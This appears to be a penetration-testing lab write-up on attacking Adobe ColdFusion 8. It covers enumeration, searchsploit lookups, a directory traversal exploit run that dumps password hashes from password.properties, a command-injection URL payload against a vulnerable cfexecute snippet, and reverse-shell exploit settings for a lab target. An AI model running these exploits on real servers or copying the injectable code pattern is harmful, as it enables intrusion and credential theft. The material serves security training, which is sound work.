Coldfusion is programming language and Web App development platform based on java. It used for dynamic and Interactive applications can be connect to various apis and databases. ColdFusion Markup Language (`CFML`) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML

```html
<cfquery name="myQuery" datasource="myDataSource">
  SELECT *
  FROM myTable
</cfquery>
```

Developers can a;so use `cfloop`.
```html
<cfloop query="myQuery">
  <p>#myQuery.firstName# #myQuery.lastName#</p>
</cfloop>
```

| **Benefits**                              | **Description**                                                                                                                                                                                                       |
| ----------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Developing data-driven web applications` | ColdFusion allows developers to build rich, responsive web applications easily. It offers session management, form handling, debugging, and more features.                                                            |
| `Integrating with databases`              | ColdFusion easily integrates with databases such as Oracle, SQL Server, and MySQL. Easy to retrieve the data even from Nosql databse.                                                                                 |
| `Simplifying web content management`      | One of the primary goals of ColdFusion is to streamline web content management. The platform offers dynamic HTML generation and simplifies form creation, URL rewriting, file uploading, and handling of large forms. |
| `Performance`                             | ColdFusion is designed to be highly performant and is optimised for low latency and high throughput.                                                                                                                  |
| `Collaboration`                           | ColdFusion offers features that allow developers to work together on projects in real-time. This includes code sharing, debugging, version control, and more.                                                         |

ColdFusion has historically been vulnerable to various types of attacks, such as SQL injection, XSS, directory traversal, authentication bypass, and arbitrary file uploads.
```
1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability
```

|Port Number|Protocol|Description|
|---|---|---|
|80|HTTP|Used for non-secure HTTP communication between the web server and web browser.|
|443|HTTPS|Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.|
|1935|RPC|Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.|
|25|SMTP|Simple Mail Transfer Protocol (SMTP) is used for sending email messages.|
|8500|SSL|Used for server communication via Secure Socket Layer (SSL).|
|5500|Server Monitor|Used for remote administration of the ColdFusion server.|
Default ports can be changed during installation.

## Enumeration

| **Method**        | **Description**                                                                                                                                                                                                   |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Port Scanning`   | ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. .                                                    |
| `File Extensions` | ColdFusion pages typically use ".cfm" or ".cfc" file extensions. its indicator that the application is using ColdFusion.                                                                                          |
| `HTTP Headers`    | Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used. |
| `Error Messages`  | If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.                                                                      |
| `Default Files`   | ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm".                                                                                             |
```shell
nmap -p- -sC -Pn 10.129.247.30 --open

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 11:45 GMT
Nmap scan report for 10.129.247.30
Host is up (0.028s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 350.38 seconds
```

The port scan results show three open ports. Two Windows RPC services, and one running on `8500`. As we know, `8500` is a default port that ColdFusion uses for SSL. Navigating to the `IP:8500` lists 2 directories, `CFIDE` and `cfdocs,` in the root, further indicating that ColdFusion is running on port 8500.

![[Pasted image 20251022011031.png]]

The `/CFIDE/administrator` path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that `ColdFusion 8` is running on the server.
![[Pasted image 20251022011112.png]]

### Attacking ColdFusion

Now that we know that ColdFusion 8 is a target, the next step is to check for existing known exploits
As we know the version if `ColdFusion 8` so.
```bash
searchsploit adobe coldfusion | grep 8
Adobe ColdFusion - Directory Traversal (Metasploit)                                 | multiple/remote/16985.rb
Adobe ColdFusion 2018 - Arbitrary File Upload                                       | multiple/webapps/45979.txt
Adobe ColdFusion 2023.6 - Remote File Read                                          | multiple/webapps/52387.py
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                 | cfm/webapps/50057.py
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site  | cfm/webapps/33170.txt
```

The `Adobe ColdFusion - Directory Traversal` and the `Adobe ColdFusion 8 - Remote Command Execution (RCE)` results.

#### Directory Traversal
The attack can be executed by manipulating the input parameters in ColdFusion tags such as `CFFile` and `CFDIRECTORY`.
```html
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

However, the `directory` parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack.
```http
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

`CVE-2010-2861` is the `Adobe ColdFusion - Directory Traversal` exploit discovered by `searchsploit`. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.
```
- CFIDE/administrator/settings/mappings.cfm
- logging/settings.cfm
- datasources/index.cfm
- j2eepackaging/editarchive.cfm
- CFIDE/administrator/enter.cfm
```

These ColdFusion files are vulnerable to a directory traversal attack in `Adobe ColdFusion 9.0.1` and `earlier versions`. Remote attackers can exploit this vulnerability to read arbitrary files

Using `searchsploit`, copy the exploit to a working directory and then execute the file to see what arguments it requires.

```shell
searchsploit -p 14641    # search by file number

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID #14641's path to the clipboard
```

`copy` the file and use it.
The `password.properties` file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses
```shell
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```

### Unauthenticated RCE
The difference between a `RCE` and an `Unauthenticated Remote Code Execution` attacker not need to provide valid authentication credentials in order to exploit the vulnerability

```html
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

Above cmd var is concatenating the `cgi.query_string` var and exeecute using `cfexecute` fun which run window `cmd.exe`. 
An attacker could simply pass a malicious command as the `cgi.query_string` variable, and it would be executed by the server.

```http
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt

# Url decoded version
http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt
```

This URL includes a semicolon (`%3B`) at the beginning of the query string, which can allow for the execution of multiple commands on the server.

`CVE-2009-2265` is the vulnerability identified by our earlier searchsploit search as `Adobe ColdFusion 8 - Remote Command Execution (RCE)`. Pull it into a working directory.

#### Searchsploit

```shell
searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057's path to the clipboard
```

```shell-session
 cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

A quick `cat` review of the code indicates that the script needs some information. Set the correct information and launch the exploit.

##### Exploit Modification
```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```



















